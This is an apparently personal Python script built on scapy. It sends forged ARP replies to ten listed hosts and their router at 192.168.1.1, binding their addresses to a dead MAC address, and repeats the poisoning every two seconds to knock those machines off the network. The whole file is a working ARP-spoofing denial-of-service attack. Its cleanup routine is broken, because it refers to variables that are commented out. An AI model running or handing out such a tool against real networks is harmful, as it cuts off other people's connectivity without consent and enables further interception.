#!/usr/bin/env python

from scapy.all import *
import time
import signal
import sys

#!!victimIP = "192.168.56.105"
#!!victimMAC = "08:00:27:49:32:8b"

#victimIP = "192.168.56.102" #I'm the victim
#!!myMAC = "08:00:27:f7:e8:72"

#victimMAC = "08:00:27:f7:e8:72" #I'm the victim
myMAC = "08:00:27:49:32:8b" #105 is the "attacker"

victims = []
victims.append(["192.168.1.11","84:38:38:6F:B8:0F"])
victims.append(["192.168.1.13","BC:F5:AC:F9:2B:1E"])
victims.append(["192.168.1.14","20:68:9D:2E:65:00"])
victims.append(["192.168.1.16","E4:98:D6:01:D5:A4"])
victims.append(["192.168.1.18","A0:ED:CD:B6:7D:0A"])
victims.append(["192.168.1.20","70:3E:AC:20:7F:6B"])
victims.append(["192.168.1.22","78:4B:87:D2:10:49"])
victims.append(["192.168.1.23","DC:F1:10:95:2D:A8"])
victims.append(["192.168.1.24","FC:C2:DE:2B:51:36"])
victims.append(["192.168.1.25","2C:CC:15:F0:39:10"])

deadEndIP = "192.168.1.1"
deadEndMAC = "84:a6:c8:af:12:ed"

killMAC = "08:00:27:ff:ff:fe"

packets = []

routerpkts = []

for i in range (0, len(victims)):
	rtpkt = Ether()/ARP()

	rtpkt.dst = deadEndMAC
	rtpkt.src = myMAC

	rtpkt.hwsrc = killMAC
	rtpkt.hwdst = deadEndMAC
	rtpkt.pdst = deadEndIP
	rtpkt.psrc = victims[i][0]
	rtpkt.op = 2

	routerpkts.append(rtpkt)

for i in range (0, len(victims)):

	pkt = Ether()/ARP()

	pkt.dst = victims[i][1]
	pkt.src = myMAC

	pkt.hwsrc = killMAC
	pkt.hwdst = victims[i][1]
	pkt.pdst= victims[i][0]
	pkt.psrc = deadEndIP
	pkt.op = 2

	packets.append(pkt)

#pkt.show()

print("Turn out the lights....")

try:
	while True:
		for i in range(0, len(victims)):
			sendp(packets[i], iface="wlan0")
			sendp(routerpkts[i], iface="wlan0")
		time.sleep(2)

except KeyboardInterrupt:
	print("Re-ARPing....")
	heal = Ether()/ARP()
	heal.src = myMAC
	heal.dst = victimMAC
	heal.hwsrc = deadEndMAC
	heal.hwdst = victimMAC
	heal.pdst = victimIP
	heal.psrc = deadEndIP
	heal.op = 2

	for i in range(0, 5):
		sendp(heal, iface="eth0")
		time.sleep(1)

	sys.exit(0)
